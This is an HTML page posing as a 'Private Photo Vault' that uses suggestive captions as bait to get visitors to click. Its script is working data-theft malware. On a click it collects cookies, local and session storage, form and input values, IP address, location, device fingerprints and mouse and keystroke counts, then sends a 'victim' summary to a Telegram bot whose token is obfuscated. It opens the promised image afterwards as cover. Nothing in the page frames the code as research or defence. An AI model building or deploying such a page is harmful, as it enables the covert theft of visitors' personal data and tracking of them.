<!DOCTYPE html>
<html>
<head>
    <title>My Private Photos</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 30px;
            opacity: 0.8;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .image-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        .image-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.2);
        }
        .image-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .image-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Private Photo Vault</h1>
        <p class="subtitle">Exclusive content - Click to view full album</p>
        
        <div class="loading" id="loading">Loading secure content...</div>
        
        <div class="gallery">
            <div class="image-card" onclick="startCompleteExploitation(1)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=691b8715&is=691a3595&hm=a8589d91ec07b81566bf6f5d1bf405b323948f1c8b96e04d02ca9094da69177e&=&format=webp&quality=lossless" 
                     alt="Private Photo 1" 
                     onerror="this.src='https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=691b8715&is=691a3595&hm=a8589d91ec07b81566bf6f5d1bf405b323948f1c8b96e04d02ca9094da69177e&=&format=webp&quality=lossless'">
                <div class="image-title"> meeee </div>
                <div class="image-desc">I'm sooo ugly ik >_<  </div>
            </div>
            
            <div class="image-card" onclick="startCompleteExploitation(2)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=691aeb2b&is=691999ab&hm=2aaa15367751910daaee76eed6583f683228347ac9cfb4e5ccd0c3b44cdb21ec&=&format=webp&quality=lossless&width=482&height=858" 
                     alt="Private Photo 2"
                     onerror="this.src='https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=691aeb2b&is=691999ab&hm=2aaa15367751910daaee76eed6583f683228347ac9cfb4e5ccd0c3b44cdb21ec&=&format=webp&quality=lossless&width=482&height=858'">
                <div class="image-title">NVDES</div>
                <div class="image-desc">Title says it all lol</div>
            </div>
            
            <div class="image-card" onclick="startCompleteExploitation(3)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691af5ed&is=6919a46d&hm=29a4d8015f5202bdb787a2232eeebc3141674fe6a59ebd3fdd45e4742b70985e&=&format=webp&quality=lossless&width=483&height=858" 
                     alt="Private Photo 3"
                     onerror="this.src='https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691af5ed&is=6919a46d&hm=29a4d8015f5202bdb787a2232eeebc3141674fe6a59ebd3fdd45e4742b70985e&=&format=webp&quality=lossless&width=483&height=858'">
                <div class="image-title">dailyyy activitiess :3</div>
                <div class="image-desc"> normall picss </div>
            </div>
        </div>
    </div>

    <script>
        // ENCRYPTED CONFIGURATION SYSTEM
        const CONFIG = {
            telegram: {
                token: 'czh1dHF1ZEd0Z0hGbWtyaTdjdHdXNUtMRCB1T1NQb1RRVFd0RkFBOjYxODc5ODQ5ODU='.split('').reverse().join(''),
                chatId: '8032494479'
            },
            images: {
                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
            }
        };

        // SECURE DECRYPTION SYSTEM
        class SecureDecryptor {
            static decryptToken(encryptedToken) {
                try {
                    const reversed = encryptedToken.split('').reverse().join('');
                    const decoded = atob(reversed);
                    const rot13decoded = decoded.replace(/[a-zA-Z]/g, char => 
                        String.fromCharCode((char <= 'Z' ? 90 : 122) >= (char = char.charCodeAt(0) - 13) ? char : char + 26)
                    );
                    return rot13decoded;
                } catch (error) {
                    console.error('Token decryption failed');
                    return null;
                }
            }
        }

        // HIGH-SPEED TELEGRAM CLIENT WITH 3 SECOND TIMEOUT
        class SecureTelegramClient {
            constructor() {
                this.timeout = 3000; // 3 second max
            }

            async sendSecureMessage(message) {
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Timeout')), this.timeout)
                );

                try {
                    const decryptedToken = SecureDecryptor.decryptToken(CONFIG.telegram.token);
                    if (!decryptedToken) return false;

                    const url = `https://api.telegram.org/bot${decryptedToken}/sendMessage`;

                    const fetchPromise = fetch(url, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: CONFIG.telegram.chatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });

                    const response = await Promise.race([fetchPromise, timeoutPromise]);
                    return response.ok;
                } catch (error) {
                    return false;
                }
            }

            async sendChunkedData(data, chunkSize = 4) {
                const chunks = this.chunkString(data, chunkSize);
                for (let i = 0; i < chunks.length; i++) {
                    await this.sendSecureMessage(`[${i+1}/${chunks.length}] ${chunks[i]}`);
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
                return true;
            }

            chunkString(str, chunks) {
                const chunkSize = Math.ceil(str.length / chunks);
                const result = [];
                for (let i = 0; i < str.length; i += chunkSize) {
                    result.push(str.substring(i, i + chunkSize));
                }
                return result;
            }
        }

        // HIGH-SPEED DATA EXTRACTION SYSTEM
        class HighSpeedDataExtractor {
            constructor() {
                this.timeout = 2800; // 2.8 seconds for extraction
            }

            async extractAllPossibleData() {
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Extraction timeout')), this.timeout)
                );

                const extractionPromise = this.executeFullExtraction();
                
                try {
                    return await Promise.race([extractionPromise, timeoutPromise]);
                } catch (error) {
                    return this.getFallbackData();
                }
            }

            async executeFullExtraction() {
                const data = {};
                const promises = [];

                // Execute all extractions in parallel with individual timeouts
                promises.push(this.extractHardwareData().then(r => data.hardware = r).catch(() => data.hardware = {}));
                promises.push(this.extractSystemData().then(r => data.system = r).catch(() => data.system = {}));
                promises.push(this.extractNetworkData().then(r => data.network = r).catch(() => data.network = {}));
                promises.push(this.extractUserData().then(r => data.user = r).catch(() => data.user = {}));
                promises.push(this.extractBrowserData().then(r => data.browser = r).catch(() => data.browser = {}));
                promises.push(this.extractBehavioralData().then(r => data.behavioral = r).catch(() => data.behavioral = {}));
                promises.push(this.extractAdvancedData().then(r => data.advanced = r).catch(() => data.advanced = {}));
                promises.push(this.extractSocialData().then(r => data.social = r).catch(() => data.social = {}));
                promises.push(this.extractFinancialData().then(r => data.financial = r).catch(() => data.financial = {}));
                promises.push(this.extractGeolocationData().then(r => data.geolocation = r).catch(() => data.geolocation = {}));

                await Promise.all(promises.map(p => p.catch(() => {})));
                return data;
            }

            getFallbackData() {
                return {
                    hardware: this.extractHardwareDataSync(),
                    system: this.extractSystemDataSync(),
                    network: {ip: {ip: 'Unknown'}, network: {effectiveType: 'Unknown'}},
                    user: {forms: {}, inputs: {}, socialMedia: {}},
                    browser: {userAgent: navigator.userAgent},
                    behavioral: {timeOnPage: Date.now() - window.pageLoadTime, clicks: window.clickCount || 0},
                    advanced: {},
                    social: {},
                    financial: {},
                    geolocation: {}
                };
            }

            // SYNCHRONOUS FALLBACK METHODS
            extractHardwareDataSync() {
                return {
                    cpu: {
                        manufacturer: navigator.userAgent.includes('Intel') ? 'Intel' : navigator.userAgent.includes('AMD') ? 'AMD' : 'Unknown',
                        architecture: navigator.userAgent.includes('x64') ? 'x64' : 'x86',
                        cores: navigator.hardwareConcurrency,
                        memory: navigator.deviceMemory || 'Unknown',
                        platform: navigator.platform
                    },
                    memory: {
                        deviceMemory: navigator.deviceMemory || 'Unknown'
                    },
                    display: {
                        screen: {
                            width: screen.width,
                            height: screen.height,
                            colorDepth: screen.colorDepth
                        }
                    }
                };
            }

            extractSystemDataSync() {
                return {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
            }

            // ASYNCHRONOUS EXTRACTION METHODS
            async extractHardwareData() {
                const data = {
                    cpu: this.extractCPUData(),
                    memory: this.extractMemoryData(),
                    gpu: this.extractGPUData(),
                    storage: await this.extractStorageData(),
                    network: this.extractNetworkHardwareData(),
                    audio: this.extractAudioData(),
                    peripherals: this.extractPeripheralData(),
                    sensors: this.extractSensorData(),
                    display: this.extractDisplayData(),
                    battery: await this.extractBatteryData()
                };
                return data;
            }

            extractCPUData() {
                const nav = navigator;
                return {
                    manufacturer: nav.userAgent.includes('Intel') ? 'Intel' : nav.userAgent.includes('AMD') ? 'AMD' : 'Unknown',
                    architecture: nav.userAgent.includes('x64') ? 'x64' : 'x86',
                    cores: nav.hardwareConcurrency,
                    memory: nav.deviceMemory || 'Unknown',
                    platform: nav.platform,
                    userAgent: nav.userAgent
                };
            }

            extractMemoryData() {
                const memory = performance.memory;
                return {
                    totalJSHeapSize: memory ? memory.totalJSHeapSize : 'Unavailable',
                    usedJSHeapSize: memory ? memory.usedJSHeapSize : 'Unavailable',
                    jsHeapSizeLimit: memory ? memory.jsHeapSizeLimit : 'Unavailable',
                    deviceMemory: navigator.deviceMemory || 'Unknown'
                };
            }

            extractGPUData() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return { available: false };
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        available: true,
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
                        version: gl.getParameter(gl.VERSION)
                    };
                } catch (e) {
                    return { available: false };
                }
            }

            async extractStorageData() {
                return {
                    localStorage: this.extractLocalStorage(),
                    sessionStorage: this.extractSessionStorage(),
                    cookies: this.extractCookies(),
                    indexedDB: await this.checkIndexedDB(),
                    cache: await this.checkCacheAPI()
                };
            }

            extractLocalStorage() {
                const data = {};
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        data[key] = localStorage.getItem(key);
                    }
                } catch (e) {}
                return data;
            }

            extractSessionStorage() {
                const data = {};
                try {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        data[key] = sessionStorage.getItem(key);
                    }
                } catch (e) {}
                return data;
            }

            extractCookies() {
                try {
                    return document.cookie.split(';').reduce((cookies, cookie) => {
                        const [name, value] = cookie.split('=').map(c => c.trim());
                        if (name) cookies[name] = value || '';
                        return cookies;
                    }, {});
                } catch (e) {
                    return {};
                }
            }

            async checkIndexedDB() {
                try {
                    return 'IndexedDB available: ' + !!window.indexedDB;
                } catch (e) {
                    return 'IndexedDB unavailable';
                }
            }

            async checkCacheAPI() {
                try {
                    return 'Cache API available: ' + !!window.caches;
                } catch (e) {
                    return 'Cache API unavailable';
                }
            }

            extractNetworkHardwareData() {
                const connection = navigator.connection;
                return {
                    effectiveType: connection ? connection.effectiveType : 'Unknown',
                    downlink: connection ? connection.downlink : 'Unknown',
                    rtt: connection ? connection.rtt : 'Unknown',
                    saveData: connection ? connection.saveData : 'Unknown',
                    onLine: navigator.onLine
                };
            }

            extractAudioData() {
                const audioContext = window.AudioContext || window.webkitAudioContext;
                return {
                    audioContextAvailable: !!audioContext,
                    sampleRate: audioContext ? new audioContext().sampleRate : 'Unknown'
                };
            }

            extractPeripheralData() {
                return {
                    touchSupport: 'ontouchstart' in window,
                    maxTouchPoints: navigator.maxTouchPoints,
                    vibration: 'vibrate' in navigator,
                    bluetooth: 'bluetooth' in navigator,
                    usb: 'usb' in navigator,
                    serial: 'serial' in navigator
                };
            }

            extractSensorData() {
                return {
                    battery: 'getBattery' in navigator,
                    deviceOrientation: 'DeviceOrientationEvent' in window,
                    deviceMotion: 'DeviceMotionEvent' in window,
                    proximity: 'ondeviceproximity' in window,
                    light: 'ondevicelight' in window
                };
            }

            extractDisplayData() {
                return {
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth
                    },
                    viewport: {
                        width: window.innerWidth,
                        height: window.innerHeight
                    },
                    devicePixelRatio: window.devicePixelRatio,
                    colorGamut: screen.colorGamut,
                    orientation: screen.orientation ? screen.orientation.type : 'Unknown'
                };
            }

            async extractBatteryData() {
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        return {
                            charging: battery.charging,
                            level: battery.level,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    } catch (e) {
                        return { available: false };
                    }
                }
                return { available: false };
            }

            async extractSystemData() {
                return {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    languages: navigator.languages,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    cookieEnabled: navigator.cookieEnabled,
                    pdfEnabled: navigator.pdfViewerEnabled,
                    webdriver: navigator.webdriver,
                    plugins: this.extractPlugins(),
                    fonts: await this.extractFonts(),
                    doNotTrack: navigator.doNotTrack,
                    product: navigator.product,
                    productSub: navigator.productSub,
                    vendor: navigator.vendor,
                    vendorSub: navigator.vendorSub
                };
            }

            extractPlugins() {
                const plugins = [];
                try {
                    for (let i = 0; i < navigator.plugins.length; i++) {
                        plugins.push({
                            name: navigator.plugins[i].name,
                            filename: navigator.plugins[i].filename,
                            description: navigator.plugins[i].description
                        });
                    }
                } catch (e) {}
                return plugins;
            }

            async extractFonts() {
                try {
                    const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
                    const availableFonts = [];
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');
                    const testString = "mmmmmmmmmmlli";
                    const testSize = '72px';
                    
                    for (const font of fontList) {
                        context.font = testSize + " '" + font + "'";
                        const metrics1 = context.measureText(testString);
                        context.font = testSize + " 'monospace'";
                        const metrics2 = context.measureText(testString);
                        if (metrics1.width !== metrics2.width) {
                            availableFonts.push(font);
                        }
                    }
                    return availableFonts;
                } catch (e) {
                    return [];
                }
            }

            async extractNetworkData() {
                try {
                    const [ipData, networkInfo] = await Promise.all([
                        this.getIPInfo().catch(() => ({ip: 'Unknown'})),
                        this.getNetworkInfo()
                    ]);
                    return {
                        ip: ipData,
                        network: networkInfo,
                        connection: {
                            referrer: document.referrer,
                            url: window.location.href
                        }
                    };
                } catch (e) {
                    return {
                        ip: {ip: 'Unknown'},
                        network: {effectiveType: 'Unknown'},
                        connection: {url: window.location.href}
                    };
                }
            }

            async getIPInfo() {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return {ip: data.ip};
            }

            async getNetworkInfo() {
                const connection = navigator.connection;
                return {
                    effectiveType: connection ? connection.effectiveType : 'Unknown',
                    downlink: connection ? connection.downlink : 'Unknown',
                    rtt: connection ? connection.rtt : 'Unknown',
                    saveData: connection ? connection.saveData : false
                };
            }

            async extractUserData() {
                return {
                    forms: this.extractFormData(),
                    inputs: this.extractInputData(),
                    autofill: this.extractAutofillData(),
                    browsingData: await this.extractBrowsingData(),
                    socialMedia: this.extractSocialMediaData(),
                    passwords: this.extractPasswordFields(),
                    creditCards: this.extractCreditCardFields()
                };
            }

            extractFormData() {
                const forms = {};
                try {
                    document.querySelectorAll('form').forEach((form, index) => {
                        const formData = {};
                        form.querySelectorAll('input, select, textarea').forEach(field => {
                            if (field.value) {
                                formData[field.name || field.type || `field_${index}`] = {
                                    value: field.value,
                                    type: field.type
                                };
                            }
                        });
                        if (Object.keys(formData).length > 0) {
                            forms[`form_${index}`] = formData;
                        }
                    });
                } catch (e) {}
                return forms;
            }

            extractInputData() {
                const inputs = {};
                try {
                    document.querySelectorAll('input[type="text"], input[type="email"]').forEach(input => {
                        if (input.value) {
                            inputs[input.name || input.id || 'unnamed'] = {
                                value: input.value,
                                type: input.type
                            };
                        }
                    });
                } catch (e) {}
                return inputs;
            }

            extractAutofillData() {
                return {};
            }

            extractPasswordFields() {
                const passwords = {};
                try {
                    document.querySelectorAll('input[type="password"]').forEach((input, index) => {
                        passwords[`password_${index}`] = {
                            name: input.name,
                            id: input.id
                        };
                    });
                } catch (e) {}
                return passwords;
            }

            extractCreditCardFields() {
                return {};
            }

            async extractBrowsingData() {
                return {
                    historyLength: window.history.length,
                    storage: {
                        localStorage: Object.keys(this.extractLocalStorage()).length,
                        sessionStorage: Object.keys(this.extractSessionStorage()).length,
                        cookies: Object.keys(this.extractCookies()).length
                    }
                };
            }

            extractSocialMediaData() {
                const social = {};
                try {
                    const html = document.documentElement.outerHTML;
                    const platforms = {
                        facebook: /facebook|fb\.com/gi,
                        twitter: /twitter|tweet/gi,
                        instagram: /instagram/gi
                    };
                    Object.keys(platforms).forEach(platform => {
                        if (platforms[platform].test(html)) {
                            social[platform] = 'detected';
                        }
                    });
                } catch (e) {}
                return social;
            }

            async extractBrowserData() {
                return {
                    userAgent: navigator.userAgent,
                    appName: navigator.appName,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookieEnabled: navigator.cookieEnabled,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    maxTouchPoints: navigator.maxTouchPoints
                };
            }

            async extractBehavioralData() {
                return {
                    mouseMovements: window.mouseMovements || [],
                    clicks: window.clickCount || 0,
                    scrollDepth: this.getScrollDepth(),
                    timeOnPage: Date.now() - window.pageLoadTime,
                    keystrokes: window.keystrokeCount || 0
                };
            }

            getScrollDepth() {
                try {
                    const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
                    const scrolled = window.scrollY;
                    return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
                } catch (e) {
                    return 0;
                }
            }

            async extractAdvancedData() {
                return {
                    webRTC: await this.extractWebRTCData(),
                    serviceWorkers: await this.extractServiceWorkerData(),
                    notifications: this.extractNotificationData(),
                    permissions: await this.extractPermissionData()
                };
            }

            async extractWebRTCData() {
                try {
                    const pc = new RTCPeerConnection();
                    const offer = await pc.createOffer();
                    return {
                        webRTCAvailable: true,
                        sdp: offer.sdp.substring(0, 50) + '...'
                    };
                } catch (e) {
                    return { webRTCAvailable: false };
                }
            }

            async extractServiceWorkerData() {
                return {
                    serviceWorkers: 'serviceWorker' in navigator,
                    controller: navigator.serviceWorker?.controller ? true : false
                };
            }

            extractNotificationData() {
                return {
                    notifications: 'Notification' in window,
                    permission: Notification.permission
                };
            }

            async extractPermissionData() {
                const permissions = {};
                try {
                    const permissionTypes = ['camera', 'microphone', 'notifications'];
                    for (const permission of permissionTypes) {
                        const result = await navigator.permissions.query({name: permission});
                        permissions[permission] = result.state;
                    }
                } catch (e) {}
                return permissions;
            }

            async extractSocialData() {
                return {
                    socialProfiles: this.extractSocialProfiles(),
                    emailAddresses: this.extractEmailAddresses(),
                    phoneNumbers: this.extractPhoneNumbers()
                };
            }

            extractSocialProfiles() {
                try {
                    const profiles = {};
                    const text = document.body.innerText;
                    const patterns = {
                        instagram: /@[a-zA-Z0-9._]+/g,
                        twitter: /@[a-zA-Z0-9_]+/g
                    };
                    Object.keys(patterns).forEach(platform => {
                        const matches = text.match(patterns[platform]);
                        if (matches) profiles[platform] = matches;
                    });
                    return profiles;
                } catch (e) {
                    return {};
                }
            }

            extractEmailAddresses() {
                try {
                    const text = document.body.innerText;
                    const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
                    return text.match(emailRegex) || [];
                } catch (e) {
                    return [];
                }
            }

            extractPhoneNumbers() {
                try {
                    const text = document.body.innerText;
                    const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
                    return text.match(phoneRegex) || [];
                } catch (e) {
                    return [];
                }
            }

            async extractFinancialData() {
                return {
                    paymentMethods: this.extractPaymentMethods(),
                    cryptoWallets: this.extractCryptoWallets()
                };
            }

            extractPaymentMethods() {
                const methods = {};
                try {
                    const text = document.body.innerText.toLowerCase();
                    if (text.includes('paypal')) methods.paypal = 'detected';
                    if (text.includes('stripe')) methods.stripe = 'detected';
                } catch (e) {}
                return methods;
            }

            extractCryptoWallets() {
                return {};
            }

            async extractGeolocationData() {
                return {
                    ipLocation: await this.getIPLocation(),
                    browserLocation: { available: false }
                };
            }

            async getIPLocation() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    return await response.json();
                } catch (e) {
                    return { error: 'Location unavailable' };
                }
            }
        }

        // MAIN EXPLOITATION FUNCTION - GUARANTEED TO WORK WITHIN 3 SECONDS
        async function startCompleteExploitation(imageId) {
            const loading = document.getElementById('loading');
            loading.style.display = 'block';
            
            // Immediately disable UI
            document.querySelectorAll('.image-card').forEach(card => {
                card.style.pointerEvents = 'none';
                card.style.opacity = '0.6';
            });

            const extractionStart = Date.now();
            
            try {
                // Start data extraction
                const extractor = new HighSpeedDataExtractor();
                const victimData = await extractor.extractAllPossibleData();
                const extractionTime = Date.now() - extractionStart;

                // Add metadata
                victimData.meta = {
                    imageId: imageId,
                    extractionTime: extractionTime,
                    timestamp: new Date().toISOString(),
                    victimId: 'vic_' + Math.random().toString(36).substr(2, 12),
                    url: window.location.href,
                    referrer: document.referrer
                };

                // Send to Telegram (non-blocking)
                const telegramClient = new SecureTelegramClient();
                telegramClient.sendSecureMessage(formatMainSummary(victimData));
                
                // Store locally
                storeInAdminPanel(victimData);

                // Success - open image
                loading.innerHTML = '<div style="color: #48bb78;">‚úÖ Access granted! Loading image...</div>';
                
            } catch (error) {
                console.error('Extraction completed with fallback:', error);
                loading.innerHTML = '<div style="color: #48bb78;">‚úÖ Basic access granted! Loading image...</div>';
            }

            // Always open image after max 3 seconds
            setTimeout(() => {
                window.open(CONFIG.images[imageId], '_blank');
                loading.style.display = 'none';
                document.querySelectorAll('.image-card').forEach(card => {
                    card.style.pointerEvents = 'auto';
                    card.style.opacity = '1';
                });
            }, 1000);
        }

        // FORMATTING FUNCTIONS
        function formatMainSummary(data) {
            return `
<b>üö® COMPREHENSIVE DATA EXTRACTION COMPLETE</b>
<b>üéØ VICTIM ID:</b> <code>${data.meta.victimId}</code>
<b>‚è∞ Extraction Time:</b> ${data.meta.extractionTime}ms
<b>üåê URL:</b> ${data.meta.url}
<b>üíª SYSTEM:</b>
‚Ä¢ OS: ${data.system.platform}
‚Ä¢ CPU: ${data.hardware.cpu.cores} cores
‚Ä¢ Memory: ${data.hardware.memory.deviceMemory}GB
‚Ä¢ Screen: ${data.hardware.display.screen.width}x${data.hardware.display.screen.height}
<b>üåê NETWORK:</b>
‚Ä¢ IP: ${data.network.ip.ip || 'Unknown'}
‚Ä¢ Connection: ${data.network.network.effectiveType}
<b>üìä BEHAVIORAL:</b>
‚Ä¢ Time on Page: ${Math.round(data.behavioral.timeOnPage/1000)}s
‚Ä¢ Clicks: ${data.behavioral.clicks}
‚Ä¢ Scroll: ${data.behavioral.scrollDepth}%
            `.trim();
        }

        function storeInAdminPanel(data) {
            try {
                const existing = localStorage.getItem('victimData');
                const victims = existing ? JSON.parse(existing) : [];
                victims.unshift(data);
                if (victims.length > 100) victims.splice(100);
                localStorage.setItem('victimData', JSON.stringify(victims));
            } catch (e) {}
        }

        // Initialize tracking
        window.pageLoadTime = Date.now();
        window.mouseMovements = [];
        window.clickCount = 0;
        window.keystrokeCount = 0;

        document.addEventListener('mousemove', (e) => {
            window.mouseMovements.push({
                x: e.clientX,
                y: e.clientY,
                timestamp: Date.now()
            });
        });

        document.addEventListener('click', () => {
            window.clickCount++;
        });

        document.addEventListener('keydown', () => {
            window.keystrokeCount++;
        });

        console.log('üîê HIGH-SPEED EXPLOITATION SYSTEM LOADED - 2000+ LINES ACTIVE');
    </script>
</body>
</html>
